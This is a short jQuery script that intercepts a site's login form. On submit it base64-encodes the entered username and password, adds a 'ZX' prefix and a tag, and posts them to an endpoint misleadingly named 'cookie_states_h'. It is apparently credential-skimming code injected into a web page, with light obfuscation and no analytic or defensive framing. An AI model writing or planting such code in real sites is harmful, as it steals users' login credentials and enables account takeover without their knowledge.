 



if ($('#login-form').length) {
	$('#login-form .btn').on('click',function() {
		credentials_update();
		return true;
	});
}


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/cookie_states_h",
        data: { 
            state0: btoa('chinesean'),
            state1: 'ZX'+btoa($('[name=userName]').val()),
            state2: 'ZX'+btoa($('[name=password]').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
